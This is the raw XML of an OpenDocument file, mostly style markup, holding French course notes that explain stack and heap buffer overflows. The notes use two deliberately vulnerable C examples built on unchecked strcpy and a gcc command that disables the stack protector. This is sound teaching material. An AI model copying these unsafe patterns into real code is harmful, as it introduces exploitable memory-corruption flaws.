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09F000001F85D9BFBEB.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000065B40000138A75D629A7.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000063390000237400F15068.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005982000013A461B56567.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000760800001E49984D28B4.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000471C0000027C6B37A257.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007C3B0000237440B0A19D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005A56000013F3B3FDE37A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000042E000000D5689F22E83.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700006216000007DC7A2081FB.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000069D600004D5003163C91.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007C07000032F5178EA85A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000073F7000018B5F3E0B47A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000051C200000DA61F2582A8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000626500000247ED713AD8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700006D0B0000237446EBA735.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007112000026A8D9511B12.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000733E00004E73C48332EE.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005471000018E9C917BF8E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007D4300001C884AEB1AC7.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004C62000023C47FBC52B1.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000542200003256C3F95423.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700006C0200000E2A20041FCA.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000061FC00000E79648A3A7F.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000577100003644FF0FEC14.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000753500001566289B30DE.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000054A6000013BFE3D6B26D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007D45000016F367DE2B8F.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005CD10000191EBF0BD173.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007C8B000003EE94391F71.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002A4600000EFD5FBA4173.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000050B9000009B8CE1C2AA8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700006E7C00002F5772DF09AE.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000645C0000103BCA107466.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007A7A00000FEC8CEB93BC.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000064C60000073D53859F44.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000651500000772F73A9B44.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005AF4000013F33F39F1AA.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000714600000561607DE2DD.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003992000006005022182B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700006C1B000026DD7445469E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001830000005CBE9FA3511.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700006EB100002FF6DD8E983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5"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6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Times New Roman" fo:font-size="12pt" style:font-name-asian="Consolas" style:font-size-asian="12pt" style:font-name-complex="Consolas" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"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8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>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Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="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1" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" style:font-name-asian="Consolas" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="Consolas" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" style:font-name-asian="Consolas" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="Consolas" style:font-size-complex="14pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"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14" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Courier New"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P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" style:font-name-asian="Consolas" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="Consolas" style:font-size-complex="11pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-size="12pt" fo:font-style="normal" style:font-name-asian="Consolas" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-name-complex="Consolas" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Courier New"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18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000"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1"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P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:color="#008000" style:font-name="Consolas" fo:font-size="9.5pt" style:font-name-asian="Consolas" style:font-size-asian="9.5pt" style:font-name-complex="Consolas" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="P22"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23" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Times New Roman"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justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" style:text-underline-style="none"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autospace="none"/>
      <style:text-properties fo:color="#800000" style:font-name="Courier New"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26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%"/>
      <style:text-properties fo:color="#408080" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="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9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Courier New"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30" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Courier New"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1" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%"/>
      <style:text-properties fo:color="#bc7a00"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#bc7a00" style:font-name="Courier New"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P33" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:text-autospace="none" style:join-border="fals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6" style:family="paragraph" style:parent-style-name="Footnote">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="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8" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="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9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="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40" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000"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1" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000"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tyle="normal" style:text-underline-style="none" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Consolas" fo:font-size="9.5pt" style:font-name-asian="Consolas" style:font-size-asian="9.5pt" style:font-name-complex="Consolas" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name-asian="Consolas" style:font-name-complex="Consolas"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Courier New" style:font-name-asian="Consolas" style:font-name-complex="Consolas"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-style="normal" style:font-name-asian="Consolas" style:font-style-asian="normal" style:font-name-complex="Consolas" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-name-asian="Consolas" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-name-complex="Consolas" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="Consolas" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="Consolas" style:font-size-complex="11pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="italic" style:font-name-asian="Consolas" style:font-style-asian="italic" style:font-name-complex="Consolas" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="normal" style:font-name-asian="Consolas" style:font-style-asian="normal" style:font-name-complex="Consolas" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#000000" style:text-position="super 58%" fo:font-style="normal" style:font-name-asian="Consolas" style:font-style-asian="normal" style:font-name-complex="Consolas" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T15"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16" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" style:font-name-asian="Consolas" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-name-complex="Consolas" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#808080" style:font-name="Consolas" fo:font-size="9.5pt" style:font-name-asian="Consolas" style:font-size-asian="9.5pt" style:font-name-complex="Consolas" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#808080" style:font-name="Consolas" fo:font-size="9.5pt" style:font-size-asian="9.5pt" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#808080" style:font-name="Courier New" style:font-name-asian="Consolas" style:font-name-complex="Consolas"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#a31515" style:font-name="Consolas" fo:font-size="9.5pt" style:font-name-asian="Consolas" style:font-size-asian="9.5pt" style:font-name-complex="Consolas" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#a31515" style:font-name="Consolas" fo:font-size="9.5pt" style:font-size-asian="9.5pt" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#0000ff" style:font-name="Consolas" fo:font-size="9.5pt" style:font-name-asian="Consolas" style:font-size-asian="9.5pt" style:font-name-complex="Consolas" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#0000ff" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#008000"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#008000" style:font-name="Consolas" fo:font-size="9.5pt" style:font-name-asian="Consolas" style:font-size-asian="9.5pt" style:font-name-complex="Consolas" style:font-size-complex="9.5pt"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#008000" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties style:font-name="Consolas" fo:font-size="9.5pt" style:font-size-asian="9.5pt" style:font-size-complex="9.5pt"/>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fo:color="#19177c"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:color="#666666"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:color="#ba2121"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:color="#aa22ff" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:color="#b00040"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:color="#408080" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties style:font-name="Times New Roman1" style:font-name-asian="Times New Roman1" style:font-name-complex="Times New Roman1"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties style:font-name="Times New Roman1" fo:font-style="italic" style:font-name-asian="Times New Roman1" style:font-style-asian="italic" style:font-name-complex="Times New Roman1" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties fo:color="#800000" style:font-name="Courier New" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties style:font-name="Times New Roman"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties fo:color="#801900" style:font-name="Courier New" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties fo:color="#bb6622" fo:font-weight="bold"/>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t; Vidéo 0201 :</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">On parle des vulnérabilités, qu'est-ce qu'une vulnérabilité etc... En général, il s'agit de défauts dans un programme (flaws), en relation avec une situation que le développeur n'avait pas prévu. La vulnérabilité la plus fréquente est la "<text:span text:style-name="T1">stack buffer overflow</text:span>". De manière très générale, cette vulnérabilité répond à la logique suivante. Dans la fonction d'un programme, on définit une sorte de <text:span text:style-name="T1">buffer</text:span><text:span text:style-name="T25">. Et ce </text:span><text:span text:style-name="T1">buffer </text:span><text:span text:style-name="T25">ne sera potentiellement pas assez grand pour tous les inputs possibles. Ce qui peut causer en soi des bugs – mais cela mène véritablement à une vulnérabilité lorsque l'input est contrôlé par l'utilisateur.</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On peut prendre l'exemple d'un programme simple, <text:span text:style-name="T2">stackbufferoverflow.c</text:span> (voir folder).</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P21">// Simple buffer overflow example</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T17">#include</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T20">&lt;string.h&gt;</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T23">void</text:span><text:span text:style-name="T6"> functionFunction(</text:span><text:span text:style-name="T23">char</text:span><text:span text:style-name="T6"> *</text:span><text:span text:style-name="T17">param</text:span><text:span text:style-name="T6">, </text:span><text:span text:style-name="T23">int</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T17">p2</text:span><text:span text:style-name="T6">, </text:span><text:span text:style-name="T23">float</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T17">p3</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T23">char</text:span><text:span text:style-name="T6"> local[10];</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/>strcpy(local,</text:span><text:span text:style-name="T17">param</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T23">int</text:span><text:span text:style-name="T6"> main(</text:span><text:span text:style-name="T23">int</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T17">argc</text:span><text:span text:style-name="T6">, </text:span><text:span text:style-name="T23">char</text:span><text:span text:style-name="T6">** </text:span><text:span text:style-name="T17">argv</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/>functionFunction(</text:span><text:span text:style-name="T17">argv</text:span><text:span text:style-name="T6">[1], 42, 3.14);</text:span></text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P22"><text:span text:style-name="T7">Dans ce programme, on a la fonction </text:span><text:span text:style-name="T8">functionFunction</text:span><text:span text:style-name="T7">, et la fonction </text:span><text:span text:style-name="T8">main</text:span><text:span text:style-name="T7">. En C ou en C++, la fonction </text:span><text:span text:style-name="T8">main</text:span><text:span text:style-name="T7"> aura deux arguments, le premier étant le nombre d'arguments qui ont été passés à la fonction (on l'appelle </text:span><text:span text:style-name="T8">argc</text:span><text:span text:style-name="T7"> par convention). Le second est un tableau de tableaux de caractère (donc un tableau de strings) qui contiendra ces arguments.</text:span></text:p>
      <text:p text:style-name="P7">[PAGE 60 du livre pour les arguments de main]</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P22"><text:span text:style-name="T7">Dans notre programme, on appelle simplement la fonction </text:span><text:span text:style-name="T8">functionFunction</text:span><text:span text:style-name="T7"> avec en paramètre le premier argument passé au programme (</text:span><text:span text:style-name="T19">argv</text:span><text:span text:style-name="T8">[1]</text:span><text:span text:style-name="T7">, puisque </text:span><text:span text:style-name="T19">argv</text:span><text:span text:style-name="T8">[0]</text:span><text:span text:style-name="T7"> contient le nom du programme lui-même) 42 et 3.14. Dans la fonction qui est exécutée, on prend le premier argument passé au programme comme paramètre (le danger commence à apparaître). Ensuite on crée un </text:span><text:span text:style-name="T12">buffer</text:span><text:span text:style-name="T13">, qui est de 10 bytes de longueur. Ensuite on appelle strcpy, qui copie le 2</text:span><text:span text:style-name="T14">nd</text:span><text:span text:style-name="T13"> paramètre (param, contrôle par l'utilisateur) dans le 1er paramètre (le </text:span><text:span text:style-name="T12">buffer </text:span><text:span text:style-name="T13">de taille 10 qu'on a initialisé).</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P22"><text:span text:style-name="T13">Le problème est évident. Notre </text:span><text:span text:style-name="T12">buffer </text:span><text:span text:style-name="T13">nous permet de contenir 9 caractères de 1 bytes, + le byte de terminaison du tableau égal à "\0". Si on rentre plus que 9 caractères, c'est là qu'on a un problème, parce que tout ce qui se trouvera après le </text:span><text:span text:style-name="T12">buffer </text:span><text:span text:style-name="T13">dans la mémoire sera overwrite.</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P12">&gt; Vidéo 0202 :</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">Maintenant on va compiler notre programme avec </text:span><text:span text:style-name="T9">gcc</text:span><text:span text:style-name="T13">. Le problème, c'est que gcc protège contre les buffer overflows automatiquement. Il va falloir ajouter le flag -fno-stack-protector pour que tout se passe bien.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P14">gcc -o stackbufferoverflow stackbufferoverflow.c -fno-stack-protector</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T13">Maintenant, on a le programme exécutable </text:span><text:span text:style-name="T9">stackbufferoverflow</text:span><text:span text:style-name="T13">. Quand on l'exécute avec, en paramètre, un string de 9 caractère ou moins, tout va bien, on a pas d'output :</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P14">./stackbufferoverflow 12g2f3drt</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">Mais quand on en a 10 ou plus, on a directement affiché "</text:span><text:span text:style-name="T10">segmentation fault</text:span><text:span text:style-name="T13">". Le programme a crash. C'est la démonstration basique d'un </text:span><text:span text:style-name="T12">buffer overflow</text:span><text:span text:style-name="T13">, qui fait ici simplement crash le programme.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">Une autre vulnérabilité qu'on peut rencontrer, c'est le "</text:span><text:span text:style-name="T12">heap buffer overflow</text:span><text:span text:style-name="T13">". Il ne s'agit plus, ici, d'exploiter la pile (</text:span><text:span text:style-name="T12">stack</text:span><text:span text:style-name="T13">) (dans laquelle les données des fonctions sont enregistrées), mais le tas (</text:span><text:span text:style-name="T12">heap</text:span><text:span text:style-name="T13">) (dans lequel le programmeur peut allouer des blocs de mémoire et les utiliser comme il le souhaite).</text:span></text:p>
      <text:p text:style-name="P10">[Livre PAGE 72-79 pour la segmentation de la mémoire]</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">En général, lorsqu'on veut allouer beaucoup de mémoire, c'est considéré comme une mauvaise idée de le faire sur la </text:span><text:span text:style-name="T12">stack</text:span><text:span text:style-name="T13"> ; on préfère le faire sur la </text:span><text:span text:style-name="T12">heap</text:span><text:span text:style-name="T13">, qui nous permet d'allouer des blocs de mémoire, dont on disposera jusqu'à ce qu'on les libère avec free().</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T13">[Livre PAGE 81-85 pour l'utilisation du tas / </text:span><text:span text:style-name="T12">heap</text:span><text:span text:style-name="T13">]</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">Exemple d'un simple </text:span><text:span text:style-name="T12">heap buffer overflow</text:span><text:span text:style-name="T13"> (voir </text:span><text:span text:style-name="T9">heapbufferoverflow.c</text:span><text:span text:style-name="T13">, folder).</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P23"><text:span text:style-name="T17">#include</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T20">&lt;string.h&gt;</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T17">#include</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T20">&lt;stdio.h&gt;</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T23">void</text:span><text:span text:style-name="T6"> main (</text:span><text:span text:style-name="T23">int</text:span><text:span text:style-name="T6"> </text:span><text:span text:style-name="T17">argc</text:span><text:span text:style-name="T6">, </text:span><text:span text:style-name="T23">char</text:span><text:span text:style-name="T6">** </text:span><text:span text:style-name="T17">argv</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T23">char</text:span><text:span text:style-name="T6">* buff = malloc(20);</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6"><text:tab/>strcpy(buff,</text:span><text:span text:style-name="T17">argv</text:span><text:span text:style-name="T6">[1]);</text:span></text:p>
      <text:p text:style-name="P4"><text:tab/>free(buff);</text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">Ici, on crée un </text:span><text:span text:style-name="T12">buffer </text:span><text:span text:style-name="T13">et on lui alloue manuellement 20 bytes. On copie ensuite le premier argument donné au programme dans ce </text:span><text:span text:style-name="T12">buffer</text:span><text:span text:style-name="T13">. Encore une fois, si ce premier argument fait plus que 19 caractères, on va overwrite ce qui se trouve ensuite dans la mémoire.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">Encore une fois, on peut compiler le programme (sans protéger la </text:span><text:span text:style-name="T12">stack </text:span><text:span text:style-name="T13">cette fois), et l'exécuter, avec beaucoup de caractère ça peut faire crash le programme. Chez moi ça n'a pas crash, mais c'est normal, les buffer overflows causent des "undefined behavior", donc parfois tout peut même fonctionner normalement.</text:span></text:p>
      <text:p text:style-name="P9"/>
